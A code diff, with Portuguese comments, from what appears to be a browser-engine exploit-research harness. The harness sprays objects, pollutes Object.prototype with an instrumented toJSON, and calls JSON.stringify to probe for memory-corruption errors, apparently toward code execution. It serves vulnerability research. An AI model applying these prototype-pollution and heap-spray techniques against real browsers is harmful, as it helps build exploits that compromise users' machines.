@@ -9,7 +9,7 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG } from '../config.mjs';
 
-class MyComplexObject { // Mesma classe dos testes anteriores
+class MyComplexObject {
     constructor(id) {
         this.id = `MyObj-${id}`;
         this.value1 = 12345;
@@ -25,182 +25,76 @@ class MyComplexObject { // Mesma classe dos testes anteriores
             if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)}`, 'critical', 'checkIntegrity');
             checkOk = false;
         }
+        // Adicione mais checagens se outros campos forem modificados
         return checkOk;
     }
     action() { return `ID:${this.id} acted`; }
 }
 
-// --- Variantes da toJSON para investigar o for...in ---
-
-export function toJSON_ForIn_V0_LoopOnly() {
-    const FNAME_toJSON = "toJSON_ForIn_V0_LoopOnly";
+// V4 Instrumented: Próximo da toJSON_ProbeGenericObject original, com logs e try-catch
+export function toJSON_ForIn_V4_Instrumented() {
+    const FNAME_toJSON = "toJSON_ForIn_V4_Instrumented";
     let iteration_count = 0;
     let error_in_loop = null;
-    try {
-        for (const prop in this) {
-            iteration_count++;
-            if (iteration_count > 10000) {
-                logS3(`[${FNAME_toJSON}] Loop for...in V0 excedeu 10000 iterações. Interrompendo. ID: ${this.id}`, "warn", FNAME_toJSON);
-                break;
-            }
-        }
-    } catch (e) {
-        error_in_loop = `${e.name}: ${e.message}`;
-    }
-    return {
-        toJSON_variant: FNAME_toJSON,
-        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
-        iterations: iteration_count,
-        error: error_in_loop
-    };
-}
+    let props_payload = {};
+    logS3(`[${FNAME_toJSON}] Entrando. this.id (se MyComplexObject): ${this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"}`, "info", FNAME_toJSON);
 
-export function toJSON_ForIn_V1_LoopAndHasOwnProperty() {
-    const FNAME_toJSON = "toJSON_ForIn_V1_LoopAndHasOwnProperty";
-    let iteration_count = 0;
-    let properties_owned_count = 0;
-    let error_in_loop = null;
-    try {
-        for (const prop in this) {
-            iteration_count++;
-            if (Object.prototype.hasOwnProperty.call(this, prop)) {
-                properties_owned_count++;
-            }
-            if (iteration_count > 10000) break;
-        }
-    } catch (e) { error_in_loop = `${e.name}: ${e.message}`; }
-    return {
-        toJSON_variant: FNAME_toJSON,
-        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
-        iterations: iteration_count,
-        owned_props_counted: properties_owned_count,
-        error: error_in_loop
-    };
-}
-
-export function toJSON_ForIn_V2_LoopAndAccess() {
-    const FNAME_toJSON = "toJSON_ForIn_V2_LoopAndAccess";
-    let iteration_count = 0;
-    let last_accessed_prop_val = "N/A"; // Não retornaremos para evitar complexidade
-    let error_in_loop = null;
-    try {
-        for (const prop in this) {
-            iteration_count++;
-            if (Object.prototype.hasOwnProperty.call(this, prop)) {
-                last_accessed_prop_val = this[prop];
-            }
-            if (iteration_count > 10000) break;
-        }
-    } catch (e) { error_in_loop = `${e.name}: ${e.message}`; }
-    return {
-        toJSON_variant: FNAME_toJSON,
-        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
-        iterations: iteration_count,
-        error: error_in_loop
-    };
-}
-
-export function toJSON_ForIn_V3_LoopAccessAndString() {
-    const FNAME_toJSON = "toJSON_ForIn_V3_LoopAccessAndString";
-    let iteration_count = 0;
-    let last_prop_as_string = "N/A";
-    let error_in_loop = null;
-    try {
-        for (const prop in this) {
-            iteration_count++;
-            if (Object.prototype.hasOwnProperty.call(this, prop)) {
-                if (typeof this[prop] !== 'function') {
-                    last_prop_as_string = String(this[prop]).substring(0, 30);
-                }
-            }
-            if (iteration_count > 10000) break;
-        }
-    } catch (e) { error_in_loop = `${e.name}: ${e.message}`; }
-    return {
-        toJSON_variant: FNAME_toJSON,
-        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
-        iterations: iteration_count,
-        last_prop_str_sample: last_prop_as_string,
-        error: error_in_loop
-    };
-}
-
-// V5 (NOVA): Loop + hasOwnProperty + Acesso + String().substring() ATRIBUÍDO A VAR LOCAL
-export function toJSON_ForIn_V5_AssignToLocalVar() {
-    const FNAME_toJSON = "toJSON_ForIn_V5_AssignToLocalVar";
-    let iteration_count = 0;
-    let error_in_loop = null;
-    let temp_prop_val_holder = null; // Variável local para segurar o valor
-    let processed_prop_count = 0;
-    try {
-        for (const prop in this) {
-            iteration_count++;
-            if (Object.prototype.hasOwnProperty.call(this, prop)) {
-                // Apenas processa propriedades esperadas para MyComplexObject
-                if (['id', 'value1', 'value2', 'marker', 'anotherProperty'].includes(prop) && typeof this[prop] !== 'function') {
-                    temp_prop_val_holder = String(this[prop]).substring(0, 50);
-                    processed_prop_count++;
-                }
-            }
-            if (iteration_count > 10000) {
-                logS3(`[${FNAME_toJSON}] Loop for...in V5 excedeu 10000 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
-                break;
-            }
-        }
-    } catch (e) {
-        error_in_loop = `${e.name}: ${e.message}`;
-        logS3(`[${FNAME_toJSON}] ERRO DENTRO DO LOOP V5: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
-    }
-    return {
-        toJSON_variant: FNAME_toJSON,
-        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
-        iterations: iteration_count,
-        processed_props: processed_prop_count,
-        // last_val_in_temp_holder: temp_prop_val_holder, // Pode ser muito para logar
-        error: error_in_loop
-    };
-}
-
-
-// V4: Próximo da toJSON_ProbeGenericObject original que causou RangeError (ATRIBUI A NOVO OBJETO)
-export function toJSON_ForIn_V4_OriginalAttempt() {
-    const FNAME_toJSON = "toJSON_ForIn_V4_OriginalAttempt";
-    let iteration_count = 0;
-    let error_in_loop = null;
-    let props_payload = {}; // Atribuição a este objeto
     try {
         if (typeof this === 'object' && this !== null) {
             for (const prop in this) {
                 iteration_count++;
+                logS3(`[${FNAME_toJSON}] Iter: ${iteration_count}, Prop: '${prop}'`, "info", FNAME_toJSON);
+
                 if (Object.prototype.hasOwnProperty.call(this, prop)) {
+                    logS3(`   [${FNAME_toJSON}] Own property. typeof this['${prop}']: ${typeof this[prop]}`, "info", FNAME_toJSON);
                     if (['id', 'value1', 'value2', 'marker', 'anotherProperty'].includes(prop) && typeof this[prop] !== 'function') {
-                        props_payload[prop] = String(this[prop]).substring(0, 50); // A ATRIBUIÇÃO CRÍTICA
+                        try {
+                            logS3(`     [${FNAME_toJSON}] Tentando: props_payload['${prop}'] = String(this['${prop}']).substring(0, 50);`, "info", FNAME_toJSON);
+                            props_payload[prop] = String(this[prop]).substring(0, 50); // A OPERAÇÃO CRÍTICA
+                            logS3(`       [${FNAME_toJSON}] Atribuição para props_payload['${prop}'] bem-sucedida.`, "good", FNAME_toJSON);
+                        } catch (e_assign) {
+                            logS3(`     [${FNAME_toJSON}] !!!! ERRO NA ATRIBUIÇÃO/CONVERSÃO para prop '${prop}' !!!!: ${e_assign.name} - ${e_assign.message}`, "critical", FNAME_toJSON);
+                            error_in_loop = `AssignmentError on '${prop}': ${e_assign.name} - ${e_assign.message}`;
+                            // Não quebrar o loop aqui, permitir que o RangeError externo (se houver) ocorra,
+                            // ou que o loop continue se este erro for capturável e não fatal.
+                        }
+                    } else {
+                         logS3(`     [${FNAME_toJSON}] Propriedade '${prop}' não processada (não está na lista ou é uma função).`, "info", FNAME_toJSON);
                     }
+                } else {
+                    logS3(`   [${FNAME_toJSON}] Propriedade '${prop}' não é 'own'.`, "info", FNAME_toJSON);
                 }
-                if (iteration_count > 10000) {
-                     logS3(`[${FNAME_toJSON}] Loop for...in V4 excedeu 10000 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
+
+                if (iteration_count > 100) { // Reduzido o safety break para logs mais curtos
+                     logS3(`[${FNAME_toJSON}] Loop for...in V4_Instrumented excedeu 100 iterações. ID: ${this.id}. Interrompendo.`, "warn", FNAME_toJSON);
+                    if (!error_in_loop) error_in_loop = "Max iterations (100) reached in for...in";
                     break;
                 }
             }
+        } else {
+            logS3(`[${FNAME_toJSON}] 'this' não é um objeto ou é null. Type: ${typeof this}`, "warn", FNAME_toJSON);
         }
-    } catch (e) {
-        error_in_loop = `${e.name}: ${e.message}`;
-        logS3(`[${FNAME_toJSON}] ERRO DENTRO DO LOOP V4: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
+    } catch (e_outer_loop) { // Captura erros do próprio loop for...in
+        error_in_loop = `OuterLoopError: ${e_outer_loop.name}: ${e_outer_loop.message}`;
+        logS3(`[${FNAME_toJSON}] ERRO NO LOOP EXTERNO V4_Instrumented: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
     }
+    logS3(`[${FNAME_toJSON}] Saindo. Iterações: ${iteration_count}. Erro interno: ${error_in_loop}. Payload keys: ${Object.keys(props_payload).join(';')}`, "info", FNAME_toJSON);
     return {
         toJSON_variant: FNAME_toJSON,
         id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
         iterations: iteration_count,
-        props_count_in_payload: Object.keys(props_payload).length, // Apenas o contador de chaves
-        error: error_in_loop
+        props_count_in_payload: Object.keys(props_payload).length,
+        internal_error: error_in_loop // Renomeado para clareza
     };
 }
 
 
-export async function executeInvestigateForInRCETest(toJSONFunctionToUse, toJSONFunctionName) {
-    const FNAME_TEST = `executeInvestigateForInRCE<${toJSONFunctionName}>`;
-    logS3(`--- Iniciando Sub-Teste: Investigando for...in com ${toJSONFunctionName} ---`, "subtest", FNAME_TEST);
-    document.title = `Investiga ForIn - ${toJSONFunctionName}`;
+// A função de teste principal adaptada para usar a V4_Instrumented
+export async function executeRevisitForInRangeErrorTest() {
+    const FNAME_TEST = `executeRevisitForInRangeErrorTest`;
+    const toJSONFunctionName = "toJSON_ForIn_V4_Instrumented";
+    logS3(`--- Iniciando Teste: Revisitando RangeError com ${toJSONFunctionName} ---`, "test", FNAME_TEST);
+    document.title = `Revisit RangeError - ${toJSONFunctionName}`;
 
     const spray_count = 50;
     const sprayed_objects = [];
@@ -261,11 +155,11 @@ export async function executeInvestigateForInRCETest(toJSONFunctionToUse, toJSON
     result.targetObjectId = target_obj.id;
 
     try {
-        result.integrityBefore = target_obj.checkIntegrity(logS3); // Passa logS3 para log de falhas
+        result.integrityBefore = target_obj.checkIntegrity(null); // Não logar daqui, a toJSON logará
         logS3(`   Integridade de ${target_obj.id} ANTES de JSON.stringify: ${result.integrityBefore}`, result.integrityBefore ? "good" : "warn", FNAME_TEST);
 
         Object.defineProperty(Object.prototype, ppKey_val, {
-            value: toJSONFunctionToUse,
+            value: toJSON_ForIn_V4_Instrumented, // Usando a versão instrumentada
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
@@ -275,17 +169,17 @@ export async function executeInvestigateForInRCETest(toJSONFunctionToUse, toJSON
         try {
             result.toJSONReturn = JSON.stringify(target_obj);
             logS3(`     JSON.stringify(${target_obj.id}) completou. Retorno da toJSON: ${JSON.stringify(result.toJSONReturn)}`, "info", FNAME_TEST);
-            if (result.toJSONReturn && result.toJSONReturn.error) {
-                 logS3(`     ERRO INTERNO na ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "warn", FNAME_TEST);
-                 result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.error };
+            if (result.toJSONReturn && result.toJSONReturn.internal_error) {
+                 logS3(`     ERRO INTERNO (reportado pela toJSON) na ${toJSONFunctionName}: ${result.toJSONReturn.internal_error}`, "warn", FNAME_TEST);
+                 if (!result.stringifyError) result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.internal_error };
             }
-        } catch (e_str) {
+        } catch (e_str) { // Captura o RangeError ou outros erros do stringify
             result.stringifyError = { name: e_str.name, message: e_str.message };
             logS3(`     !!!! ERRO AO STRINGIFY ${target_obj.id} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
-            if (e_str.stack && e_str.name === 'RangeError') logS3(`       Stack (RangeError): ${e_str.stack}`, "error");
+            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
         }
 
-        result.integrityAfter = target_obj.checkIntegrity(logS3);
+        result.integrityAfter = target_obj.checkIntegrity(null);
         logS3(`   Integridade de ${target_obj.id} APÓS JSON.stringify: ${result.integrityAfter}`, result.integrityAfter ? "good" : "warn", FNAME_TEST);
 
     } catch (e_main_test_logic) {
@@ -303,13 +197,15 @@ export async function executeInvestigateForInRCETest(toJSONFunctionToUse, toJSON
         document.title = `RangeError with ${toJSONFunctionName} on ${target_obj.id}!`;
     } else if (result.stringifyError) {
         logS3(`   Outro erro (${result.stringifyError.name}) ocorreu com ${toJSONFunctionName} para ${target_obj.id}.`, "error", FNAME_TEST);
+    } else if (result.toJSONReturn && result.toJSONReturn.internal_error) {
+        logS3(`   Erro interno capturado pela ${toJSONFunctionName} para ${target_obj.id}: ${result.toJSONReturn.internal_error}`, "warn", FNAME_TEST);
     } else if (!result.integrityBefore || !result.integrityAfter) {
         logS3(`   Falha de integridade detectada para ${target_obj.id} com ${toJSONFunctionName}.`, "warn", FNAME_TEST);
     } else {
-        logS3(`   ${toJSONFunctionName} para ${target_obj.id} completou sem RangeError ou falha de integridade óbvia.`, "good", FNAME_TEST);
+        logS3(`   ${toJSONFunctionName} para ${target_obj.id} completou sem RangeError ou erro interno óbvio.`, "good", FNAME_TEST);
     }
 
-    logS3(`--- Sub-Teste com ${toJSONFunctionName} CONCLUÍDO ---`, "subtest", FNAME_TEST);
+    logS3(`--- Sub-Teste com ${toJSONFunctionName} (Revisitando RangeError) CONCLUÍDO ---`, "subtest", FNAME_TEST);
     clearOOBEnvironment();
     sprayed_objects.length = 0;
     globalThis.gc?.();
